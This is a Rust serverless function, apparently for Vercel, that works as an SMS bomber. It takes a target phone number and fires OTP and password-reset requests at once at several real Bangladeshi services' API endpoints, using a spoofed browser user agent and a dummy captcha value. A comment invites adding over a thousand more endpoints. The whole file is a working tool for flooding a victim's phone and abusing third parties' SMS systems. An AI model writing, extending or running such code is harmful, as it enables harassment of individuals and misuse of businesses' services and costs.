use vercel_runtime::{run, Body, Error, Request, Response, StatusCode};
use reqwest::{Client, header::{HeaderMap, HeaderValue, CONTENT_TYPE, USER_AGENT}};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::time::Duration;
use futures::future::join_all;


// 1. API Structure
struct SmsApi {
    name: &'static str,
    url: &'static str,
    method: &'static str,
    body_builder: fn(&str) -> Value,
}

#[derive(Deserialize)]
struct BombRequest {
    number: String,
}

#[tokio::main]
async fn main() -> Result<(), Error> {
    run(handler).await
}

pub async fn handler(req: Request) -> Result<Response<Body>, Error> {
    // --- 🛡️ API PROTECTION CONNECTION START ---
    // JavaScript protection layer theke asha Auth Token check kora hochhe
    let auth_token = req.headers().get("x-auth-token");
    if auth_token.is_none() {
        return Ok(Response::builder()
            .status(StatusCode::UNAUTHORIZED)
            .body(json!({"error": "Unauthorized", "message": "Security token missing!"}).to_string().into())?);
    }
    // --- 🛡️ API PROTECTION CONNECTION END ---

    if req.method() != "POST" {
        return Ok(Response::builder().status(StatusCode::METHOD_NOT_ALLOWED).body("POST Only".into())?);
    }

    let body: BombRequest = match serde_json::from_slice(req.body()) {
        Ok(val) => val,
        Err(_) => return Ok(Response::builder().status(StatusCode::BAD_REQUEST).body("Invalid JSON".into())?),
    };

    let target_number = body.number;
    let client = Client::builder()
        .timeout(Duration::from_secs(9)) 
        .build()?;

    // 2. API LIST (Add your 1000+ APIs here)
    let apis = vec![
        SmsApi {
            name: "Shadhin Music",
            url: "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",
            method: "POST",
            body_builder: |p| json!({"msisdn": format!("880{}", &p.replace("0", "")), "shortcode": 16235, "servicename": "Shadhin Music"}),
        },
        SmsApi {
            name: "Khaodao",
            url: "https://api.eat-z.com/auth/customer/app-connect",
            method: "POST",
            body_builder: |p| json!({"username": format!("+88{}", &p.replace("0", ""))}),
        },
        SmsApi {
            name: "Walton Plaza",
            url: "https://waltonplaza.com.bd/api/auth/otp/create",
            method: "POST",
            body_builder: |p| json!({"auth": {"countryCode": "880", "phone": p.replace("0", "")}, "captchaToken": "recapcha"}),
        },
        SmsApi {
            name: "Easy.com.bd",
            url: "https://core.easy.com.bd/api/v1/forgot-password-otp",
            method: "POST",
            body_builder: |p| json!({"device_key": "2ea97d276a980993308116baa292cec9", "mobile": p}),
        },
    ];

    let mut tasks = vec![];

    for api in apis {
        let client_ref = client.clone();
        let number = target_number.clone();

        let task = tokio::spawn(async move {
            let body_data = (api.body_builder)(&number);
            let mut headers = HeaderMap::new();
            headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/json"));
            headers.insert(USER_AGENT, HeaderValue::from_static("Mozilla/5.0 (Windows NT 10.0; Win64; x64)"));

            if api.method == "POST" {
                let _ = client_ref.post(api.url).headers(headers).json(&body_data).send().await;
            } else {
                let _ = client_ref.get(api.url).headers(headers).send().await;
            }
        });
        tasks.push(task);
    }

    join_all(tasks).await;

    Ok(Response::builder()
        .status(StatusCode::OK)
        .header("Content-Type", "application/json")
        .body(json!({"status": "executed", "target": target_number}).to_string().into())?)
}
